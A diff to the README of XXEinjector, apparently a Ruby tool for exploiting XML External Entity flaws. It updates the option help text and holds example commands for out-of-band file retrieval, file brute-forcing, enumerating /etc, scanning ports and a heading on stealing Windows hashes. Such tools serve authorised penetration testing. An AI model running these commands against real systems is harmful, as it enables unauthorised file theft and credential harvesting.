@@ -14,7 +14,7 @@ XXEinjector automates retrieving files using direct and out of band methods. Dir
   --rport	    Remote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)
 
   --oob		    Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)
-  --direct	    Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)
+  --direct	    Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --direct-xml to see how XML in request file should look like or --localdtd-xml if you want to use local DTD during exploitation. In case of any problems with start and end marks when special characters are present in reponse before or after output data please use Burp Proxy match and replace option to replace that. (--direct=UNIQUEMARKSTART,UNIQUEMARKEND)
   --cdata	    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB is used to construct CDATA payload. Specify --cdata-xml to see how request should look like in this technique.
   --2ndfile	    File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)
   --phpfilter	Use PHP filter to base64 encode target file before sending.
@@ -36,7 +36,7 @@ XXEinjector automates retrieving files using direct and out of band methods. Dir
 
   --test	    This mode shows request with injected payload and quits. Used to verify correctness of request without sending it to a server.
   --urlencode	URL encode injected DTD. This is default for URI.
-  --nodtd	    If you want to put DTD in request by yourself. Specify "--dtd" to show how DTD should look like.
+  --nodtd	    If you want to put DTD in request by yourself. Specify "--oob-xml" to show how DTD should look like.
   --output	    Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)
   --timeout	    Timeout for receiving file/directory content. (--timeout=20)
   --contimeout	Timeout for closing connection with server. This is used to prevent DoS condition. (--contimeout=20)
@@ -55,7 +55,7 @@ XXEinjector automates retrieving files using direct and out of band methods. Dir
   Bruteforcing files using HTTP out of band method and netdoc protocol:
   ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
   Enumerating using direct exploitation:
-  ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
+  ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARKSTART,UNIQUEMARKEND
   Enumerating unfiltered ports:
   ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
   Stealing Windows hashes:
